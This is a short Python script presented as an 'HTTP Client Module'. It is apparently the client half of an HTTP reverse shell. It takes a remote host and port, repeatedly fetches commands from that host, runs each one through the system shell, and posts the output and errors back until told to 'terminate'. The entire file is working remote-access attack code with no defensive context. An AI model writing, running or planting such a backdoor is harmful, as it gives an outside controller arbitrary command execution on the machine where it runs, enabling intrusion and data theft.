#!/usr/bin/env python3

import subprocess
import requests
import time

def main():
    #
    print("[*] HTTP Client Module [*]")
    #
    host = input("[+] Enter the RHOST:RPORT-> ")
    #
    while(True):
        #
        GetRequest = requests.get(host)
        #
        command = GetRequest.text
        #
        if('terminate' in command):
            #
            break
            #
        else:
            #
            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            #
            PostResponse = requests.post(url=host,data=CMD.stdout.read())
            #
            PostResponse = requests.post(url=host,data=CMD.stderr.read())
            #
        time.sleep(3)

if(__name__ == '__main__'):
    #
    main()
